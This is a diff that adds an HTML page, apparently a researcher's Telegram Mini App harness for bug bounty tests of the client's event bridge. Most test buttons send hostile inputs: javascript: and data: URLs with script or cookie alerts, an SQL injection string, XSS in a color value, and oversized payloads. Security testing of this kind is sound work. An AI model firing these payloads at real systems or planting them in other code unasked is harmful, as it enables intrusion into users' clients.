@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram Security Research v2</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: var(--tg-theme-bg-color, #fff);
+      color: var(--tg-theme-text-color, #000);
+      padding: 16px;
+      max-width: 500px;
+      margin: 0 auto;
+    }
+    h2 { font-size: 17px; margin-bottom: 4px; }
+    p  { font-size: 12px; color: #888; margin-bottom: 12px; }
+    .section {
+      background: var(--tg-theme-secondary-bg-color, #f5f5f5);
+      border-radius: 10px;
+      padding: 12px;
+      margin-bottom: 12px;
+    }
+    .section h3 { font-size: 13px; margin: 0 0 8px 0; }
+    button {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 6px;
+      text-align: left;
+    }
+    .btn-blue   { background: #2481cc; color: #fff; }
+    .btn-orange { background: #f0a500; color: #fff; }
+    .btn-red    { background: #e53935; color: #fff; }
+    .btn-green  { background: #43a047; color: #fff; }
+    .btn-purple { background: #7b1fa2; color: #fff; }
+    #log {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      font-size: 11px;
+      padding: 10px;
+      border-radius: 8px;
+      min-height: 100px;
+      max-height: 200px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .clear-btn {
+      background: #333;
+      color: #fff;
+      margin-top: 6px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+<h2>🔬 Telegram Security Research v2</h2>
+<p>Testing various Mini App event types for Telegram Bug Bounty research.</p>
+
+<!-- TEST 1: web_app_share_to_story -->
+<div class="section">
+  <h3>🧪 Test 1: web_app_share_to_story</h3>
+  <button class="btn-blue" onclick="test_share_story_normal()">▶ Normal story share</button>
+  <button class="btn-orange" onclick="test_share_story_js()">⚠ javascript: URL in widget_link</button>
+  <button class="btn-red" onclick="test_share_story_data()">🔴 data: URL in media_url</button>
+</div>
+
+<!-- TEST 2: web_app_open_link -->
+<div class="section">
+  <h3>🧪 Test 2: web_app_open_link (patched CVE-2024-33905)</h3>
+  <button class="btn-green" onclick="test_open_link_normal()">▶ Normal HTTPS link</button>
+  <button class="btn-orange" onclick="test_open_link_js()">⚠ javascript: protocol</button>
+  <button class="btn-red" onclick="test_open_link_data()">🔴 data: protocol</button>
+  <button class="btn-red" onclick="test_open_link_tg()">🔴 tg:// protocol</button>
+</div>
+
+<!-- TEST 3: web_app_setup_closing_behavior -->
+<div class="section">
+  <h3>🧪 Test 3: web_app_setup_closing_behavior</h3>
+  <button class="btn-blue" onclick="test_closing_normal()">▶ Normal (need_confirmation: true)</button>
+  <button class="btn-orange" onclick="test_closing_payload()">⚠ Inject in need_confirmation</button>
+</div>
+
+<!-- TEST 4: web_app_invoke_custom_method -->
+<div class="section">
+  <h3>🧪 Test 4: web_app_invoke_custom_method</h3>
+  <button class="btn-purple" onclick="test_custom_method()">▶ getStorageValues</button>
+  <button class="btn-red" onclick="test_custom_method_inject()">🔴 SQL injection in method name</button>
+  <button class="btn-red" onclick="test_custom_method_overflow()">🔴 Large params payload</button>
+</div>
+
+<!-- TEST 5: web_app_set_background_color -->
+<div class="section">
+  <h3>🧪 Test 5: web_app_set_background_color</h3>
+  <button class="btn-green" onclick="test_bg_normal()">▶ Normal color (#ff0000)</button>
+  <button class="btn-orange" onclick="test_bg_xss()">⚠ XSS in color value</button>
+  <button class="btn-red" onclick="test_bg_overflow()">🔴 Very long color string</button>
+</div>
+
+<!-- LOG -->
+<div class="section">
+  <h3>📋 Event Log</h3>
+  <div id="log">Waiting...\n</div>
+  <button class="clear-btn" onclick="clearLog()">🗑 Clear</button>
+</div>
+
+<script>
+const tg = window.Telegram?.WebApp;
+const logEl = document.getElementById('log');
+
+function log(msg) {
+  const ts = new Date().toLocaleTimeString();
+  logEl.textContent += `[${ts}] ${msg}\n`;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function clearLog() { logEl.textContent = 'Cleared.\n'; }
+
+function send(eventType, eventData) {
+  log(`→ Sending: ${eventType}`);
+  log(`  data: ${JSON.stringify(eventData)}`);
+  window.parent.postMessage(JSON.stringify({ eventType, eventData }), '*');
+  if (window.TelegramWebviewProxy) {
+    window.TelegramWebviewProxy.postEvent(eventType, JSON.stringify(eventData));
+    log(`  (also sent via TelegramWebviewProxy)`);
+  }
+}
+
+window.addEventListener('message', (e) => {
+  try {
+    const d = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
+    if (d?.eventType) log(`← Received: ${d.eventType} → ${JSON.stringify(d.eventData ?? {})}`);
+  } catch {}
+});
+
+// TEST 1
+function test_share_story_normal() {
+  send('web_app_share_to_story', {
+    media_url: 'https://germzu.github.io/tg-test/test.png',
+    widget_link: { url: 'https://t.me/Germzutest_bot', name: 'Test' }
+  });
+}
+function test_share_story_js() {
+  send('web_app_share_to_story', {
+    media_url: 'https://germzu.github.io/tg-test/test.png',
+    widget_link: { url: 'javascript:alert(document.cookie)', name: 'Test' }
+  });
+}
+function test_share_story_data() {
+  send('web_app_share_to_story', {
+    media_url: 'data:text/html,<script>alert(1)<\/script>',
+    widget_link: { url: 'https://t.me/Germzutest_bot', name: 'Test' }
+  });
+}
+
+// TEST 2
+function test_open_link_normal() {
+  send('web_app_open_link', { url: 'https://telegram.org' });
+}
+function test_open_link_js() {
+  send('web_app_open_link', { url: 'javascript:alert(document.cookie)' });
+}
+function test_open_link_data() {
+  send('web_app_open_link', { url: 'data:text/html,<h1>XSS</h1>' });
+}
+function test_open_link_tg() {
+  send('web_app_open_link', { url: 'tg://resolve?domain=GermzuTestBot' });
+}
+
+// TEST 3
+function test_closing_normal() {
+  send('web_app_setup_closing_behavior', { need_confirmation: true });
+}
+function test_closing_payload() {
+  send('web_app_setup_closing_behavior', { need_confirmation: 'true; alert(1)' });
+}
+
+// TEST 4
+function test_custom_method() {
+  send('web_app_invoke_custom_method', {
+    req_id: 'test_001',
+    method: 'getStorageValues',
+    params: { keys: ['balance', 'user_id'] }
+  });
+}
+function test_custom_method_inject() {
+  send('web_app_invoke_custom_method', {
+    req_id: 'test_002',
+    method: "getStorage'; DROP TABLE users; --",
+    params: {}
+  });
+}
+function test_custom_method_overflow() {
+  send('web_app_invoke_custom_method', {
+    req_id: 'test_003',
+    method: 'getStorageValues',
+    params: { keys: Array(1000).fill('key_' + 'A'.repeat(100)) }
+  });
+}
+
+// TEST 5
+function test_bg_normal() {
+  send('web_app_set_background_color', { color: '#ff0000' });
+}
+function test_bg_xss() {
+  send('web_app_set_background_color', { color: '"><script>alert(1)<\/script>' });
+}
+function test_bg_overflow() {
+  send('web_app_set_background_color', { color: '#' + 'A'.repeat(10000) });
+}
+
+// Init
+if (tg) {
+  tg.ready();
+  tg.expand();
+  log(`✅ WebApp ready. Version: ${tg.version}`);
+  log(`📱 Platform: ${tg.platform}`);
+} else {
+  log('⚠ Not inside Telegram!');
+}
+</script>
+</body>
+</html>
